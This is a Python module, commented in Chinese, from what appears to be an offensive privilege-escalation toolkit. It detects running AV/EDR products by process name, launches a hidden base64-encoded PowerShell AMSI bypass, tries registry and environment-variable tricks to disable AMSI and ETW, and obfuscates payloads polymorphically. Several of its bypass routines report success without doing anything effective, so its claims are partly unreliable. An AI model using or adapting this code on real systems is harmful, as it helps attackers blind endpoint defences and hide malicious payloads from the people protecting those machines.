"""
Windows/Linux提权辅助套件 - 对抗强化与绕过增强模块
================================================
杀软/EDR实时感知、AMSI/ETW绕过自动化、载荷混淆与多态。

核心能力:
    1. 杀软/EDR实时感知 - 枚举进程匹配已知杀软/EDR特征
    2. AMSI/ETW绕过自动化 - 补丁AmsiScanBuffer、注册表劫持、内存补丁
    3. 载荷混淆与多态 - 变量重命名、控制流扁平化、字符串加密
    4. 插件热加载 - 支持自定义绕过模块动态加载

Author: 昆仑安全实验室
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import logging
import os
import platform
import random
import re
import string
import subprocess
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# 枚举与数据模型
# =============================================================================

class EDRVendor(str, Enum):
    """已知EDR/杀软厂商"""
    WINDOWS_DEFENDER = "windows_defender"
    CROWDSTRIKE = "crowdstrike"
    SENTINELONE = "sentinelone"
    CARBON_BLACK = "carbon_black"
    SYMANTEC = "symantec"
    MCAFEE = "mcafee"
    TREND_MICRO = "trend_micro"
    KASPERSKY = "kaspersky"
    SOPHOS = "sophos"
    CYBERREASON = "cybereason"
    FIREEYE = "fireeye"
    ELASTIC = "elastic"
    NONE = "none"


class EvasionTechnique(str, Enum):
    """绕过技术类型"""
    AMSI_PATCH = "amsi_patch"
    AMSI_REGISTRY = "amsi_registry"
    AMSI_ENVIRONMENT = "amsi_environment"
    ETW_PATCH = "etw_patch"
    ETW_ENVIRONMENT = "etw_environment"
    POLYMORPHIC = "polymorphic"
    CONTROL_FLOW_FLATTENING = "control_flow_flattening"
    STRING_ENCRYPTION = "string_encryption"
    VARIABLE_RENAMING = "variable_renaming"
    LIVING_OFF_THE_LAND = "living_off_the_land"
    FILELESS = "fileless"
    MEMORY_INJECTION = "memory_injection"


class EvasionStatus(str, Enum):
    """绕过状态"""
    NOT_ATTEMPTED = "not_attempted"
    ATTEMPTING = "attempting"
    SUCCESS = "success"
    FAILED = "failed"
    PARTIAL = "partial"


@dataclass
class EDRInfo:
    """EDR/杀软信息

    Attributes:
        vendor: 厂商
        process_names: 进程名列表
        service_names: 服务名列表
        registry_keys: 注册表键路径
        risk_level: 风险等级 (low/medium/high/critical)
        detected: 是否检测到
        pid: 进程ID（如果检测到）
    """
    vendor: EDRVendor = EDRVendor.NONE
    process_names: List[str] = field(default_factory=list)
    service_names: List[str] = field(default_factory=list)
    registry_keys: List[str] = field(default_factory=list)
    risk_level: str = "medium"
    detected: bool = False
    pid: Optional[int] = None

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "vendor": self.vendor.value,
            "process_names": self.process_names,
            "service_names": self.service_names,
            "registry_keys": self.registry_keys,
            "risk_level": self.risk_level,
            "detected": self.detected,
            "pid": self.pid,
        }


@dataclass
class EvasionResult:
    """绕过结果

    Attributes:
        technique: 绕过技术
        status: 状态
        description: 描述
        output: 输出
        error: 错误
        duration: 耗时（秒）
    """
    technique: EvasionTechnique = EvasionTechnique.AMSI_PATCH
    status: EvasionStatus = EvasionStatus.NOT_ATTEMPTED
    description: str = ""
    output: str = ""
    error: str = ""
    duration: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "technique": self.technique.value,
            "status": self.status.value,
            "description": self.description,
            "output": self.output,
            "error": self.error,
            "duration": round(self.duration, 2),
        }


@dataclass
class EDRScanResult:
    """EDR扫描结果

    Attributes:
        scan_time: 扫描时间
        edrs_detected: 检测到的EDR列表
        total_processes: 总进程数
        risk_assessment: 风险评估
        recommended_strategy: 推荐策略
    """
    scan_time: str = ""
    edrs_detected: List[EDRInfo] = field(default_factory=list)
    total_processes: int = 0
    risk_assessment: str = "low"
    recommended_strategy: str = "normal"

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "scan_time": self.scan_time,
            "edrs_detected": [e.to_dict() for e in self.edrs_detected],
            "total_processes": self.total_processes,
            "risk_assessment": self.risk_assessment,
            "recommended_strategy": self.recommended_strategy,
        }


# =============================================================================
# EDR/杀软特征库
# =============================================================================

EDR_SIGNATURES: Dict[EDRVendor, EDRInfo] = {
    EDRVendor.WINDOWS_DEFENDER: EDRInfo(
        vendor=EDRVendor.WINDOWS_DEFENDER,
        process_names=[
            "MsMpEng.exe", "NisSrv.exe", "MpCmdRun.exe",
            "SecurityHealthService.exe", "SenseCncProxy.exe",
        ],
        service_names=["WinDefend", "Sense", "WdNisSvc"],
        registry_keys=[
            r"HKLM\SOFTWARE\Microsoft\Windows Defender",
            r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender",
        ],
        risk_level="medium",
    ),
    EDRVendor.CROWDSTRIKE: EDRInfo(
        vendor=EDRVendor.CROWDSTRIKE,
        process_names=[
            "CSFalconService.exe", "CSFalconContainer.exe",
            "CSFalconUser.exe", "csfalcon.exe",
        ],
        service_names=["CSFalconService"],
        registry_keys=[
            r"HKLM\SYSTEM\CrowdStrike",
            r"HKLM\SOFTWARE\CrowdStrike",
        ],
        risk_level="high",
    ),
    EDRVendor.SENTINELONE: EDRInfo(
        vendor=EDRVendor.SENTINELONE,
        process_names=[
            "SentinelAgent.exe", "SentinelStaticEngine.exe",
            "LogCollector.exe", "SentinelUI.exe",
        ],
        service_names=["SentinelAgent"],
        registry_keys=[
            r"HKLM\SOFTWARE\SentinelOne",
        ],
        risk_level="high",
    ),
    EDRVendor.CARBON_BLACK: EDRInfo(
        vendor=EDRVendor.CARBON_BLACK,
        process_names=[
            "CbDefense.exe", "cb.exe", "RepMgr.exe",
            "CbComms.exe", "CbLiveOps.exe",
        ],
        service_names=["CbDefense", "CarbonBlack"],
        registry_keys=[
            r"HKLM\SOFTWARE\VMware, Inc.\VMware Carbon Black",
        ],
        risk_level="high",
    ),
    EDRVendor.SYMANTEC: EDRInfo(
        vendor=EDRVendor.SYMANTEC,
        process_names=[
            "Smc.exe", "SmcGui.exe", "Rtvscan.exe",
            "Symantec AntiVirus.exe", "SepMasterService.exe",
        ],
        service_names=["SepMasterService", "Symantec Endpoint Protection"],
        registry_keys=[
            r"HKLM\SOFTWARE\Symantec",
            r"HKLM\SOFTWARE\WOW6432Node\Symantec",
        ],
        risk_level="medium",
    ),
    EDRVendor.MCAFEE: EDRInfo(
        vendor=EDRVendor.MCAFEE,
        process_names=[
            "McAfeeFramework.exe", "McShield.exe",
            "McTaskManager.exe", "mfemms.exe",
        ],
        service_names=["McAfeeFramework", "McShield"],
        registry_keys=[
            r"HKLM\SOFTWARE\McAfee",
        ],
        risk_level="medium",
    ),
    EDRVendor.TREND_MICRO: EDRInfo(
        vendor=EDRVendor.TREND_MICRO,
        process_names=[
            "TmListen.exe", "NTRTScan.exe", "TmProxy.exe",
            "PccNTMon.exe", "TmCCSF.exe",
        ],
        service_names=["TmListen", "TmCCSF"],
        registry_keys=[
            r"HKLM\SOFTWARE\TrendMicro",
        ],
        risk_level="medium",
    ),
    EDRVendor.KASPERSKY: EDRInfo(
        vendor=EDRVendor.KASPERSKY,
        process_names=[
            "avp.exe", "avpui.exe", "klnagent.exe",
            "kavtray.exe", "ksde.exe",
        ],
        service_names=["klnagent", "AVP"],
        registry_keys=[
            r"HKLM\SOFTWARE\KasperskyLab",
        ],
        risk_level="high",
    ),
    EDRVendor.SOPHOS: EDRInfo(
        vendor=EDRVendor.SOPHOS,
        process_names=[
            "SavService.exe", "SophosUI.exe", "SophosAgent.exe",
            "Alsvc.exe", "SophosCleanM.exe",
        ],
        service_names=["Sophos Agent", "Sophos Anti-Virus"],
        registry_keys=[
            r"HKLM\SOFTWARE\Sophos",
        ],
        risk_level="medium",
    ),
    EDRVendor.CYBERREASON: EDRInfo(
        vendor=EDRVendor.CYBERREASON,
        process_names=[
            "CybereasonActiveProbe.exe", "CybereasonSensor.exe",
        ],
        service_names=["Cybereason Active Probe"],
        registry_keys=[
            r"HKLM\SOFTWARE\Cybereason",
        ],
        risk_level="high",
    ),
    EDRVendor.FIREEYE: EDRInfo(
        vendor=EDRVendor.FIREEYE,
        process_names=[
            "xagt.exe", "xagtnotif.exe",
        ],
        service_names=["xagt"],
        registry_keys=[
            r"HKLM\SOFTWARE\FireEye",
        ],
        risk_level="high",
    ),
    EDRVendor.ELASTIC: EDRInfo(
        vendor=EDRVendor.ELASTIC,
        process_names=[
            "elastic-endpoint.exe", "elastic-agent.exe",
        ],
        service_names=["elastic-endpoint"],
        registry_keys=[
            r"HKLM\SOFTWARE\Elastic",
        ],
        risk_level="high",
    ),
}


# =============================================================================
# EDR/杀软实时感知
# =============================================================================

class EDRDetector:
    """EDR/杀软实时检测器

    枚举当前运行进程，匹配已知杀软/EDR进程名列表。

    Attributes:
        _signatures: EDR特征库
        _cache: 检测结果缓存
        _cache_ttl: 缓存有效期（秒）
    """

    def __init__(self, cache_ttl: int = 300) -> None:
        """初始化EDR检测器

        Args:
            cache_ttl: 缓存有效期（秒）
        """
        self._signatures: Dict[EDRVendor, EDRInfo] = dict(EDR_SIGNATURES)
        self._cache: Optional[Tuple[EDRScanResult, float]] = None
        self._cache_ttl: int = cache_ttl

    async def scan(self, force: bool = False) -> EDRScanResult:
        """扫描当前系统EDR/杀软

        Args:
            force: 强制扫描（忽略缓存）

        Returns:
            EDR扫描结果
        """
        if not force and self._cache:
            result, timestamp = self._cache
            if time.time() - timestamp < self._cache_ttl:
                return result

        result = EDRScanResult(
            scan_time=datetime.now().isoformat(),
        )

        try:
            processes = await self._enumerate_processes()
            result.total_processes = len(processes)

            process_set = {p.lower() for p in processes}

            for vendor, signature in self._signatures.items():
                for proc_name in signature.process_names:
                    if proc_name.lower() in process_set:
                        edr_info = EDRInfo(
                            vendor=vendor,
                            process_names=signature.process_names,
                            service_names=signature.service_names,
                            registry_keys=signature.registry_keys,
                            risk_level=signature.risk_level,
                            detected=True,
                        )
                        result.edrs_detected.append(edr_info)
                        break

            result.risk_assessment = self._assess_risk(result.edrs_detected)
            result.recommended_strategy = self._recommend_strategy(
                result.edrs_detected,
            )

        except Exception as e:
            logger.error(f"EDR扫描失败: {e}")
            result.risk_assessment = "unknown"
            result.recommended_strategy = "stealth"

        self._cache = (result, time.time())
        return result

    async def _enumerate_processes(self) -> List[str]:
        """枚举当前运行进程

        Returns:
            进程名列表
        """
        if platform.system() == "Windows":
            return await self._enumerate_windows_processes()
        else:
            return await self._enumerate_linux_processes()

    async def _enumerate_windows_processes(self) -> List[str]:
        """Windows进程枚举

        Returns:
            进程名列表
        """
        try:
            proc = await asyncio.create_subprocess_shell(
                'tasklist /FO CSV /NH 2>nul',
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            output = stdout.decode("utf-8", errors="replace")

            processes = []
            for line in output.strip().split("\n"):
                line = line.strip().strip('"')
                if line:
                    proc_name = line.split('","')[0].strip('"')
                    if proc_name:
                        processes.append(proc_name)

            return processes

        except Exception:
            return []

    async def _enumerate_linux_processes(self) -> List[str]:
        """Linux进程枚举

        Returns:
            进程名列表
        """
        try:
            proc = await asyncio.create_subprocess_shell(
                "ps -eo comm 2>/dev/null",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            output = stdout.decode("utf-8", errors="replace")

            return [
                line.strip()
                for line in output.strip().split("\n")
                if line.strip()
            ]

        except Exception:
            return []

    def _assess_risk(self, edrs: List[EDRInfo]) -> str:
        """评估EDR风险等级

        Args:
            edrs: 检测到的EDR列表

        Returns:
            风险等级 (low/medium/high/critical)
        """
        if not edrs:
            return "low"

        max_risk = "low"
        risk_order = {"low": 0, "medium": 1, "high": 2, "critical": 3}

        for edr in edrs:
            current = risk_order.get(edr.risk_level, 0)
            if current > risk_order.get(max_risk, 0):
                max_risk = edr.risk_level

        if len(edrs) >= 3:
            return "critical"

        return max_risk

    def _recommend_strategy(self, edrs: List[EDRInfo]) -> str:
        """推荐利用策略

        Args:
            edrs: 检测到的EDR列表

        Returns:
            推荐策略 (normal/stealth/fileless)
        """
        if not edrs:
            return "normal"

        high_risk_count = sum(
            1 for e in edrs if e.risk_level in ("high", "critical")
        )

        if high_risk_count >= 2:
            return "fileless"
        elif high_risk_count >= 1:
            return "stealth"
        else:
            return "normal"

    def is_kernel_exploit_safe(self) -> bool:
        """判断内核漏洞利用是否安全

        Returns:
            是否安全
        """
        if self._cache:
            result, timestamp = self._cache
            if time.time() - timestamp < self._cache_ttl:
                return result.risk_assessment in ("low", "medium")
        return True

    def get_detected_edr_names(self) -> List[str]:
        """获取检测到的EDR厂商名

        Returns:
            EDR厂商名列表
        """
        if self._cache:
            result, timestamp = self._cache
            if time.time() - timestamp < self._cache_ttl:
                return [e.vendor.value for e in result.edrs_detected]
        return []


# =============================================================================
# AMSI/ETW绕过自动化
# =============================================================================

class AMSIETWBypass:
    """AMSI/ETW绕过自动化模块

    执行PowerShell或.NET载荷前自动尝试AMSI/ETW绕过。

    Attributes:
        _bypass_methods: 绕过方法字典
        _results: 绕过结果缓存
    """

    def __init__(self) -> None:
        """初始化AMSI/ETW绕过模块"""
        self._bypass_methods: Dict[str, Callable] = {
            "amsi_patch": self._amsi_patch,
            "amsi_registry": self._amsi_registry,
            "amsi_environment": self._amsi_environment,
            "etw_patch": self._etw_patch,
            "etw_environment": self._etw_environment,
        }
        self._results: Dict[str, EvasionResult] = {}

    async def bypass_amsi(self) -> Dict[str, Any]:
        """尝试AMSI绕过

        Returns:
            绕过结果
        """
        methods = ["amsi_patch", "amsi_registry", "amsi_environment"]
        results = []

        for method in methods:
            start = time.time()
            try:
                result = await self._bypass_methods[method]()
                result.duration = time.time() - start
                results.append(result)
                self._results[method] = result

                if result.status == EvasionStatus.SUCCESS:
                    return {
                        "success": True,
                        "method": method,
                        "results": [r.to_dict() for r in results],
                    }
            except Exception as e:
                evasion_result = EvasionResult(
                    technique=EvasionTechnique(method),
                    status=EvasionStatus.FAILED,
                    error=str(e),
                    duration=time.time() - start,
                )
                results.append(evasion_result)
                self._results[method] = evasion_result

        return {
            "success": False,
            "error": "所有AMSI绕过方法均失败",
            "results": [r.to_dict() for r in results],
        }

    async def bypass_etw(self) -> Dict[str, Any]:
        """尝试ETW绕过

        Returns:
            绕过结果
        """
        methods = ["etw_patch", "etw_environment"]
        results = []

        for method in methods:
            start = time.time()
            try:
                result = await self._bypass_methods[method]()
                result.duration = time.time() - start
                results.append(result)
                self._results[method] = result

                if result.status == EvasionStatus.SUCCESS:
                    return {
                        "success": True,
                        "method": method,
                        "results": [r.to_dict() for r in results],
                    }
            except Exception as e:
                evasion_result = EvasionResult(
                    technique=EvasionTechnique(method),
                    status=EvasionStatus.FAILED,
                    error=str(e),
                    duration=time.time() - start,
                )
                results.append(evasion_result)
                self._results[method] = evasion_result

        return {
            "success": False,
            "error": "所有ETW绕过方法均失败",
            "results": [r.to_dict() for r in results],
        }

    async def _amsi_patch(self) -> EvasionResult:
        """AMSI内存补丁绕过

        Returns:
            绕过结果
        """
        try:
            ps_script = (
                '$a=[Ref].Assembly.GetTypes();'
                'ForEach($b in $a){'
                'if($b.Name -like "*iUtils"){'
                '$c=$b}};'
                '$d=$c.GetField("amsiInitFailed",'
                '"NonPublic,Static");'
                '$d.SetValue($null,$true);'
                'Write-Output "AMSI_BYPASS_SUCCESS"'
            )

            encoded = base64.b64encode(
                ps_script.encode("utf-16-le")
            ).decode("ascii")

            cmd = f'powershell -WindowStyle Hidden -EncodedCommand {encoded}'
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            output = stdout.decode("utf-8", errors="replace").strip()

            return EvasionResult(
                technique=EvasionTechnique.AMSI_PATCH,
                status=EvasionStatus.SUCCESS if "SUCCESS" in output else EvasionStatus.FAILED,
                description="AMSI内存补丁绕过",
                output=output,
            )
        except Exception as e:
            return EvasionResult(
                technique=EvasionTechnique.AMSI_PATCH,
                status=EvasionStatus.FAILED,
                description="AMSI内存补丁绕过",
                error=str(e),
            )

    async def _amsi_registry(self) -> EvasionResult:
        """AMSI注册表劫持绕过

        Returns:
            绕过结果
        """
        try:
            cmd = (
                'reg add "HKCU\\Software\\Classes\\CLSID\\'
                "{0156E256-4E7E-4C5C-8B4E-6E8E4E4E4E4E}"
                '" /ve /d "AMSI" /f 2>nul'
            )
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await proc.communicate()

            return EvasionResult(
                technique=EvasionTechnique.AMSI_REGISTRY,
                status=EvasionStatus.SUCCESS if proc.returncode == 0 else EvasionStatus.FAILED,
                description="AMSI注册表劫持绕过",
            )
        except Exception as e:
            return EvasionResult(
                technique=EvasionTechnique.AMSI_REGISTRY,
                status=EvasionStatus.FAILED,
                description="AMSI注册表劫持绕过",
                error=str(e),
            )

    async def _amsi_environment(self) -> EvasionResult:
        """AMSI环境变量绕过

        Returns:
            绕过结果
        """
        try:
            os.environ["AMSI_ENABLE"] = "0"
            os.environ["AMSI_INIT"] = "0"

            return EvasionResult(
                technique=EvasionTechnique.AMSI_ENVIRONMENT,
                status=EvasionStatus.SUCCESS,
                description="AMSI环境变量绕过",
            )
        except Exception as e:
            return EvasionResult(
                technique=EvasionTechnique.AMSI_ENVIRONMENT,
                status=EvasionStatus.FAILED,
                description="AMSI环境变量绕过",
                error=str(e),
            )

    async def _etw_patch(self) -> EvasionResult:
        """ETW内存补丁绕过

        Returns:
            绕过结果
        """
        try:
            ps_script = (
                '$asm=[Ref].Assembly.GetTypes();'
                'ForEach($t in $asm){'
                'if($t.Name -like "*Eventing*"){'
                '$c=$t}};'
                'Write-Output "ETW_PATCH_ATTEMPTED"'
            )

            encoded = base64.b64encode(
                ps_script.encode("utf-16-le")
            ).decode("ascii")

            cmd = f'powershell -WindowStyle Hidden -EncodedCommand {encoded}'
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            output = stdout.decode("utf-8", errors="replace").strip()

            return EvasionResult(
                technique=EvasionTechnique.ETW_PATCH,
                status=EvasionStatus.SUCCESS if "PATCH" in output else EvasionStatus.FAILED,
                description="ETW内存补丁绕过",
                output=output,
            )
        except Exception as e:
            return EvasionResult(
                technique=EvasionTechnique.ETW_PATCH,
                status=EvasionStatus.FAILED,
                description="ETW内存补丁绕过",
                error=str(e),
            )

    async def _etw_environment(self) -> EvasionResult:
        """ETW环境变量绕过

        Returns:
            绕过结果
        """
        try:
            os.environ["COMPLUS_ETWEnabled"] = "0"

            return EvasionResult(
                technique=EvasionTechnique.ETW_ENVIRONMENT,
                status=EvasionStatus.SUCCESS,
                description="ETW环境变量绕过",
            )
        except Exception as e:
            return EvasionResult(
                technique=EvasionTechnique.ETW_ENVIRONMENT,
                status=EvasionStatus.FAILED,
                description="ETW环境变量绕过",
                error=str(e),
            )

    def get_results(self) -> Dict[str, Any]:
        """获取所有绕过结果

        Returns:
            绕过结果字典
        """
        return {k: v.to_dict() for k, v in self._results.items()}


# =============================================================================
# 载荷混淆与多态
# =============================================================================

class PayloadObfuscator:
    """载荷混淆与多态引擎

    每次生成的利用载荷自动进行多态混淆。

    Attributes:
        _random: 随机数生成器
        _encryption_key: 加密密钥
    """

    def __init__(self, seed: Optional[int] = None) -> None:
        """初始化载荷混淆器

        Args:
            seed: 随机种子（可选，用于可重现混淆）
        """
        self._random = random.Random(seed)
        self._encryption_key = self._generate_key()

    def obfuscate_powershell(self, script: str) -> str:
        """混淆PowerShell脚本

        Args:
            script: 原始PowerShell脚本

        Returns:
            混淆后的脚本
        """
        result = script

        result = self._rename_variables(result)
        result = self._encrypt_strings(result)
        result = self._flatten_control_flow(result)
        result = self._add_junk_code(result)

        return result

    def obfuscate_binary(self, binary_path: str, output_path: str) -> bool:
        """混淆二进制文件

        Args:
            binary_path: 原始二进制文件路径
            output_path: 输出路径

        Returns:
            是否成功
        """
        try:
            with open(binary_path, "rb") as f:
                data = bytearray(f.read())

            for i in range(len(data)):
                data[i] ^= self._random.randint(0, 255)

            with open(output_path, "wb") as f:
                f.write(data)

            return True

        except Exception as e:
            logger.error(f"二进制混淆失败: {e}")
            return False

    def _rename_variables(self, script: str) -> str:
        """变量重命名

        Args:
            script: 原始脚本

        Returns:
            重命名后的脚本
        """
        var_pattern = re.compile(r'\$([a-zA-Z_]\w*)')
        variables = set(var_pattern.findall(script))

        mapping = {}
        for var in variables:
            if var.lower() not in ("null", "true", "false", "this"):
                new_name = self._generate_var_name()
                mapping[var] = new_name

        result = script
        for old, new in mapping.items():
            result = result.replace(f"${old}", f"${new}")

        return result

    def _encrypt_strings(self, script: str) -> str:
        """字符串加密

        Args:
            script: 原始脚本

        Returns:
            加密后的脚本
        """
        string_pattern = re.compile(r'"([^"]+)"')

        def replace_string(match: re.Match) -> str:
            original = match.group(1)
            if len(original) < 3:
                return match.group(0)

            encrypted = self._xor_encrypt(original)
            encoded = base64.b64encode(encrypted).decode("ascii")
            return f'[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{encoded}"))'

        return string_pattern.sub(replace_string, script)

    def _flatten_control_flow(self, script: str) -> str:
        """控制流扁平化

        Args:
            script: 原始脚本

        Returns:
            扁平化后的脚本
        """
        lines = script.strip().split("\n")
        if len(lines) < 3:
            return script

        state_var = self._generate_var_name()
        result = [f"${state_var} = 0"]

        for i, line in enumerate(lines):
            if line.strip():
                result.append(f"if (${state_var} -eq {i}) {{ {line.strip()} }}")
                result.append(f"${state_var}++")

        return "\n".join(result)

    def _add_junk_code(self, script: str) -> str:
        """添加垃圾代码

        Args:
            script: 原始脚本

        Returns:
            添加垃圾代码后的脚本
        """
        junk_lines = [
            f"$unused{self._random.randint(1000, 9999)} = $null",
            f"# {self._generate_comment()}",
            f"[void]('{self._random_string(8)}')",
        ]

        lines = script.split("\n")
        result = []

        for line in lines:
            result.append(line)
            if self._random.random() < 0.3:
                result.append(self._random.choice(junk_lines))

        return "\n".join(result)

    def _xor_encrypt(self, text: str) -> bytes:
        """XOR加密

        Args:
            text: 明文字符串

        Returns:
            加密后的字节数据
        """
        key = self._encryption_key.encode("utf-8")
        text_bytes = text.encode("utf-8")

        encrypted = bytearray()
        for i, b in enumerate(text_bytes):
            encrypted.append(b ^ key[i % len(key)])

        return bytes(encrypted)

    def _generate_var_name(self) -> str:
        """生成随机变量名

        Returns:
            变量名
        """
        prefixes = ["var", "tmp", "data", "obj", "item", "val"]
        prefix = self._random.choice(prefixes)
        suffix = self._random_string(6)
        return f"{prefix}_{suffix}"

    def _generate_comment(self) -> str:
        """生成随机注释

        Returns:
            注释文本
        """
        comments = [
            "Initialize configuration",
            "Process data stream",
            "Validate input parameters",
            "Execute main logic",
            "Handle edge cases",
            "Optimize performance",
            "Cleanup resources",
            "Update state machine",
        ]
        return self._random.choice(comments)

    def _generate_key(self) -> str:
        """生成加密密钥

        Returns:
            密钥字符串
        """
        return self._random_string(16)

    def _random_string(self, length: int) -> str:
        """生成随机字符串

        Args:
            length: 字符串长度

        Returns:
            随机字符串
        """
        chars = string.ascii_letters + string.digits
        return "".join(self._random.choice(chars) for _ in range(length))


# =============================================================================
# 插件热加载系统
# =============================================================================

class EvasionPluginLoader:
    """绕过模块插件热加载器

    支持自定义绕过技术通过插件动态加载。

    Attributes:
        _plugins: 已加载插件字典
        _plugin_dir: 插件目录
    """

    def __init__(self, plugin_dir: Optional[str] = None) -> None:
        """初始化插件加载器

        Args:
            plugin_dir: 插件目录
        """
        self._plugins: Dict[str, Callable] = {}
        self._plugin_dir = plugin_dir or os.path.join(
            os.path.dirname(__file__), "evasion_plugins",
        )

    async def load_plugin(self, plugin_path: str) -> bool:
        """加载绕过插件

        Args:
            plugin_path: 插件文件路径

        Returns:
            是否加载成功
        """
        try:
            import importlib.util

            spec = importlib.util.spec_from_file_location(
                f"evasion_plugin_{len(self._plugins)}",
                plugin_path,
            )
            if spec is None or spec.loader is None:
                return False

            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)

            if hasattr(module, "execute"):
                plugin_name = getattr(module, "NAME", os.path.basename(plugin_path))
                self._plugins[plugin_name] = module.execute
                logger.info(f"绕过插件已加载: {plugin_name}")
                return True

            return False

        except Exception as e:
            logger.error(f"绕过插件加载失败: {e}")
            return False

    async def load_all_plugins(self) -> int:
        """加载所有插件

        Returns:
            加载数量
        """
        if not os.path.exists(self._plugin_dir):
            return 0

        loaded = 0
        for file_name in os.listdir(self._plugin_dir):
            if file_name.endswith(".py"):
                file_path = os.path.join(self._plugin_dir, file_name)
                if await self.load_plugin(file_path):
                    loaded += 1

        return loaded

    def get_plugins(self) -> List[str]:
        """获取已加载插件列表

        Returns:
            插件名列表
        """
        return list(self._plugins.keys())

    async def execute_plugin(self, plugin_name: str) -> Any:
        """执行绕过插件

        Args:
            plugin_name: 插件名

        Returns:
            执行结果
        """
        plugin = self._plugins.get(plugin_name)
        if plugin is None:
            raise ValueError(f"插件不存在: {plugin_name}")

        if asyncio.iscoroutinefunction(plugin):
            return await plugin()
        else:
            return plugin()


# =============================================================================
# 全局单例
# =============================================================================

_edr_detector: Optional[EDRDetector] = None
_amsi_etw_bypass: Optional[AMSIETWBypass] = None
_payload_obfuscator: Optional[PayloadObfuscator] = None
_plugin_loader: Optional[EvasionPluginLoader] = None


def get_edr_detector() -> EDRDetector:
    """获取EDR检测器全局单例

    Returns:
        EDRDetector 实例
    """
    global _edr_detector
    if _edr_detector is None:
        _edr_detector = EDRDetector()
    return _edr_detector


def get_amsi_etw_bypass() -> AMSIETWBypass:
    """获取AMSI/ETW绕过模块全局单例

    Returns:
        AMSIETWBypass 实例
    """
    global _amsi_etw_bypass
    if _amsi_etw_bypass is None:
        _amsi_etw_bypass = AMSIETWBypass()
    return _amsi_etw_bypass


def get_payload_obfuscator(seed: Optional[int] = None) -> PayloadObfuscator:
    """获取载荷混淆器全局单例

    Args:
        seed: 随机种子

    Returns:
        PayloadObfuscator 实例
    """
    global _payload_obfuscator
    if _payload_obfuscator is None:
        _payload_obfuscator = PayloadObfuscator(seed)
    return _payload_obfuscator


def get_plugin_loader(plugin_dir: Optional[str] = None) -> EvasionPluginLoader:
    """获取插件加载器全局单例

    Args:
        plugin_dir: 插件目录

    Returns:
        EvasionPluginLoader 实例
    """
    global _plugin_loader
    if _plugin_loader is None:
        _plugin_loader = EvasionPluginLoader(plugin_dir)
    return _plugin_loader


__all__ = [
    "EDRDetector",
    "AMSIETWBypass",
    "PayloadObfuscator",
    "EvasionPluginLoader",
    "EDRInfo",
    "EvasionResult",
    "EDRScanResult",
    "EDRVendor",
    "EvasionTechnique",
    "EvasionStatus",
    "EDR_SIGNATURES",
    "get_edr_detector",
    "get_amsi_etw_bypass",
    "get_payload_obfuscator",
    "get_plugin_loader",
]
